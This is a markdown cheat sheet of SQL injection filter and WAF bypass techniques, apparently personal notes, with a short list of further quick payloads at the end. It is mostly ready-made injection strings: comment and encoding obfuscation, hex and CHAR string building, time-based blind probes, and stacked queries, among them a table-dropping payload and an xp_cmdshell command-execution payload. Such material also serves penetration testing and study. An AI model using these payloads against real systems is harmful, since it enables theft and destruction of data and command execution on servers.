# check 


<details>
  <summary>Tips</summary>

# 🔐 SQL Injection Filter Bypass Techniques

A curated guide to evading input filtering during SQL injection attacks. Each technique includes a description and when to use it.

---

## 1. Comment-Based Obfuscation

**Description:** Breaks up keywords using SQL comments.

**Examples:**

* `UN/**/ION/**/SELECT`
* `/*!50000SELECT*/ user`
* `' OR 1=1 --`

**Use When:**

* Keywords like `SELECT`, `UNION`, etc. are blacklisted.
* Working with MySQL or PostgreSQL.

---

## 2. Case Variation

**Description:** Varies keyword casing to bypass case-sensitive filters.

**Example:**

* `UnIoN SeLeCt`

**Use When:**

* Filters are case-sensitive and not normalized.

---

## 3. URL & Double Encoding

**Description:** Encodes payloads to bypass filters that scan raw input.

**Examples:**

* `' OR 1=1 --` → `%27%20OR%201%3D1--`
* `%2527` → Decodes to `%27` → `'`

**Use When:**

* WAF or app blocks characters like `'`, `--`, `=` or spaces.

---

## 4. Hexadecimal Encoding

**Description:** Encodes strings or keywords using hex.

**Example:**

* `SELECT 0x61646d696e` → "admin"

**Use When:**

* String literals are filtered.
* You want to hide payloads in queries.

---

## 5. String Construction (CHAR, CONCAT)

**Description:** Constructs strings to avoid filtered literals.

**Examples:**

* `CHAR(97,100,109,105,110)`
* `CONCAT('ad','min')`

**Use When:**

* `'admin'` or other strings are blocked.

---

## 6. Logical/Arithmetic Obfuscation

**Description:** Obfuscates values using math or logic.

**Examples:**

* `1*1`, `1337+0x0a`

**Use When:**

* Simple values or logic are blocked or validated.

---

## 7. Keyword Avoidance

**Description:** Uses alternate functions to bypass blacklisted keywords.

**Examples:**

* `EXTRACTVALUE()` (MySQL)
* `LENGTH()`, `ASCII()`, `SUBSTRING()`

**Use When:**

* `SELECT`, `UNION`, etc., are completely blocked.

---

## 8. WAF-Specific Payload Tricks

**Description:** Payload shaping to bypass Web Application Firewalls.

**Examples:**

* `' OR 1=1 --blah`
* `UNION%09SELECT`

**Use When:**

* You see 403/406 errors when injecting.

---

## 9. Time-Based Payloads (Blind SQLi)

**Description:** Use time delays to confirm injection.

**Examples:**

* `SLEEP(5)` (MySQL)
* `WAITFOR DELAY '00:00:05'` (MSSQL)

**Use When:**

* No error messages or output is reflected.

---

## 10. Stacked Queries

**Description:** Executes multiple SQL commands.

**Examples:**

* `'; DROP TABLE users; --`
* `'; exec xp_cmdshell('whoami'); --`

**Use When:**

* DBMS supports stacked queries (MSSQL, PostgreSQL).

---

## 11. DBMS-Specific Functions

**Description:** Use DB-specific built-ins for stealth extraction.

**Examples:**

* `VERSION()`, `@@version`, `pg_sleep()`

**Use When:**

* You’ve fingerprinted the DBMS.

---

## 12. Second-Order Injection

**Description:** Injected input executes in a different context/time.

**Examples:**

* `User-Agent`, `Referer`, or stored profile data.

**Use When:**

* Direct input isn’t vulnerable, but used later in queries.

---

## 13. HTTP Parameter Pollution (HPP)

**Description:** Sends multiple values for the same parameter.

**Example:**

* `id=1&id=2 OR 1=1`

**Use When:**

* Filters only inspect first or last param.

---

## 14. Unicode / UTF-16 Encoding

**Description:** Encodes input using Unicode.

**Example:**

* `'` → `\u0027`

**Use When:**

* Filters check ASCII only.

---

## 15. Whitespace Manipulation

**Description:** Replaces space with tabs, newlines, or comment blocks.

**Examples:**

* `UNION%0ASELECT`, `UNION/**/SELECT`

**Use When:**

* Space is filtered or blacklisted.

---

## 16. Protocol-Level Tricks

**Description:** Advanced tricks at HTTP level.

**Examples:**

* Chunked encoding, multipart bypass, host header abuse.

**Use When:**

* WAF/proxy blocks everything else.

---

## 🧠 Pro Tips

* Always identify DBMS and filtering behavior first.
* Use Burp Suite Intruder and Repeater for fuzzing.
* Blind SQLi often requires time-based or second-order tricks.

---

**Last updated: May 2025**

  
</details>


- > if ``OR '1'='1'--`` not work try : 
  > 
  > ```
  > ' OR '1'='1' /*
  > ```
  >
  > if A WAF blocks typical SQL keywords ``(SELECT, UNION, OR)``.
  >
  > ```
  > 1' /*!UNION*/ SELECT 1,2--
  > ```
  >
  > most effective for error-based SQLi here ``https://example.com/product.php?id=5``
  >
  > ```
  > 5' AND (SELECT 1/0)--
  > ```
  >
  > Best advanced technique to bypass heavy WAF filtering:
  > > Use hex-encoded values and mid-query obfuscation like UN//ION**
  > > ```
  > > Obfuscation (e.g., UN/**/ION, 0x73656c656374 for 'select')
  > > ```
  >
  > 
